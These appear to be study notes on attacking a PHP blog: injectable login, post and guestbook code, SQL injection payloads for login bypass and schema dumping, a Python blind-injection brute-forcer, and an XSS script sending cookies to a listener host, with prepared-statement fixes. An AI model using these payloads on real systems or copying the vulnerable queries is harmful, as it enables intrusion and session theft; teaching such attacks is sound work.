# SQLI BASIC / AUTH BYPASS

## Code

```php
$username = $_POST['username'];
$password = $_POST['password'];

$login = mysqli_query($conn, "SELECT * FROM users WHERE username = '{$username}' AND password = '{$password}'");

if (mysqli_num_rows($login) == 0) {
  die("Username atau password salah!");
} else {
  ...
}
```

## Payload
```sql
SELECT * FROM users WHERE username='xzy' AND password='bar'

SELECT * FROM users WHERE username='xzy'-- ' AND password='bar'

SELECT * FROM users WHERE username='xzy' OR 1=1 LIMIT 1 -- ' AND password='bar'
```

## FIX 1

```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);

```
## FIX 2
```php
$username = $_POST['username'];
$password = $_POST['password'];

$stmt = mysqli_prepare($conn, "SELECT * FROM users WHERE username = ? AND password = ?");
mysqli_stmt_bind_param($stmt, "ss", $username, $password);
mysqli_stmt_execute($stmt);
```

#

`post.php?id=1`

```
post.php?id=1 UNION SELECT 1,2

post.php?id=1 UNION SELECT 1,2,3,4

post.php?id=9999999 UNION SELECT 1,2,3,4

post.php?id=9999999 UNION SELECT 1,database(),3,4
```

## CODE
```php
$id = $_GET['id'];
$q  = mysqli_query($conn, "SELECT * FROM posts WHERE id = {$id}") or die(mysqli_error($conn));
```

```sql
SELECT * FROM posts WHERE id = 1

SELECT * FROM posts WHERE id = 99999 UNION SELECT 1, group_concat(table_name), 3, 4 FROM information_schema.tables WHERE table_schema='blog'

SELECT * FROM posts WHERE id = 99999 UNION SELECT 1, group_concat(column_name), 3, 4 FROM information_schema.columns WHERE table_schema='blog' AND table_name='users'

```

# SQLI BLID

```sql
SELECT * FROM users WHERE username='xzy' OR database() ='blog' LIMIT 1 -- ' AND password='bar'

SELECT * FROM users WHERE username='xzy' OR BINARY substring(database(), 1, 1) ='b' LIMIT 1 -- ' AND password='bar'
```

```python
import requests
import sys

url = 'https://'

for i in range(1, 10):
  for c in range(0x20, 0x7f):
    username = "xzy' OR BINARY substring(database(), %d, 1) ='%s' -- " % (i, chr(c))
    password = "xyz"
    form = {'username': username, 'password': password, 'submit': 'Login'}
    response = requests.post(url, data=form)
    if "Halaman administrasi blog" in response.text:
      status = True
    elif "Username atau password salah" in response.text:
      status = False
    
    if status == True:
      sys.stdout.write(chr(c))
      sys.stdout.flush()
      break
print ''
```

# SQLI INSERT

## CODE
```php
$nama = $_POST['nama'];
$pesan = $_POST['pesan'];

$insert = mysqli_query($conn, "INSERT INTO guestbook (id, tanggal, nama, pesan) VALUES(NULL, NOW(), '{$nama}', '{$pesan}')");
```

```sql
INSERT INTO tables (column1, column2) VALUES (abc, def)

INSERT INTO tables (column1, column2) VALUES ('abc', database())-- ', 'def')

INSERT INTO tables (column1, column2) VALUES ('abc', (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='blog'))-- ', 'def')

INSERT INTO tables (column1, column2) VALUES ('abc', 'def'), (database(), user())-- ', 'def')
```

# XSS

```bash
python -m http.server 8080
```
```html
nice..
<script>
new Image().src = "http://192.168.1.11:8080?cookie=" + document.cookie;
</script>
```
